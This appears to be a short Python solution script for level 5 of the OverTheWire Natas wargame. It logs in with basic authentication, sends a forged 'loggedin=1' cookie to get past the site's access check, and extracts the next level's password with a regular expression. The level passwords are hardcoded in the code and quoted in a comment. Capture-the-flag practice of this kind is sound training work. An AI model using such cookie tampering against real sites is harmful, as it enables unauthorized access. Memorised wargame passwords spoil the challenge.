#!/usr/bin/env python3
# request with basic authentication

import requests
import re

username = 'natas5'
password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'

url = f'http://{username}.natas.labs.overthewire.org/'
#print (url)

cookies = {"loggedin": "1"}

# response = requests.get(url, auth = (username, password))
session = requests.Session()
response = session.get(url, auth = (username, password), cookies = cookies)

print (response.text)
print (re.findall(" natas6 is (.*)</div>", response.text)[0])
# print (session.cookies)
# cookie test loggedin=0 
# het resultaat bevat het password
# Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div>                                                                            
